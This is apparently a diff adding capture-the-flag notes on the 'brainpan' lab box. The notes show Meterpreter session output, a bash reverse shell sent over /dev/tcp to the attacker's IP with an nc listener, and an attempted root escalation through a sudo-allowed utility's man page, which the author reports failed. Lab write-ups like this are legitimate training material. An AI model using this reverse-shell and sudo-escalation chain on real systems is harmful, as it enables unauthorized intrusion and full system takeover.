+[*] Meterpreter session 1 opened (127.0.0.1:1234 -> 127.0.0.1:51566) at 2021-06-02 10:39:19 -0400
+
+meterpreter > id
+[-] Unknown command: id.
+meterpreter > getuid
+Server username: KALI\root
+meterpreter > exit
+[*] Shutting down Meterpreter...
+
+
+LETS CHANGE THE IP (IN MSFVENOM AND MULTI HANDLER) AND RUN THE EXPLOIT TO GET THE SHELL IN THE REMOTE MACHINE
+----------------------------------------------------------------------------------------------------------------
+
+
+GOT THE SHELL ON THE BOX!!
+------------------------------
+
+
+[*] Started reverse TCP handler on 10.8.73.218:1234 
+[*] Sending stage (175174 bytes) to 10.10.181.32
+[*] Meterpreter session 2 opened (10.8.73.218:1234 -> 10.10.181.32:57753) at 2021-06-02 10:44:37 -0400
+
+meterpreter > getuid
+Server username: brainpan\puck
+meterpreter > 
+
+AFTER  GETTING A SHELL WE CAN SEE THAT IT IS THE WINDOWS BOX WITH LINUX FILE SYSTEM
+SO I GO IN THE /BIN DIRECTORY EXECUTE THE "BASH" BINARY LIKE THIS:
+----------------------------------------------------------------------
+
+Z:\bin>bash id
+/usr/bin/id: /usr/bin/id: cannot execute binary file
+
+
+id
+uid=1002(puck) gid=1002(puck) groups=1002(puck)
+sudo -l
+Matching Defaults entries for puck on this host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User puck may run the following commands on this host:
+    (root) NOPASSWD: /home/anansi/bin/anansi_util
+
+
+NOW WE ARE IN A REAL LINUX SHELL
+AS WE CAN SEE THE SUDOERS "ANANSI_UTIL" CAN RUN AS ROOT
+
+LETS CHECK THAT FILE:
+-------------------------
+Z:\bin>sudo -u root /home/anansi/bin/anansi_util
+Usage: /home/anansi/bin/anansi_util [action]
+Where [action] is one of:
+  - network
+  - proclist
+  - manual [command]
+
+
+WE CAN RUN THE COMMANDS IN MANUAL PAGE (GTFOBINS):
+----------------------------------------------------
+
+GOT A REVERSE SHELL FIRST FROM THE MSFCONSOLE: (VERY ANNOYING)
+-----------------------------------------------
+
+Z:\bin>python3 -c 'import pty; pty.spawn("/bin/bash")'    
+puck@brainpan:/bin$ bash -i >& /dev/tcp/10.8.73.218/4444 0>&1
+
+GOT A REVERSE SHELL:
+-----------------------
+# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.181.32] 46764
+bash: no job control in this shell
+puck@brainpan:/bin$ id
+id
+uid=1002(puck) gid=1002(puck) groups=1002(puck)
+puck@brainpan:/bin$ 
+
+
+type :
+sudo -u root /home/anansi/bin/anansi_util manual man (followed by)!/bin/bash
+
+to get a root shell
+
+(IM NOT ABLE TO GET IT)
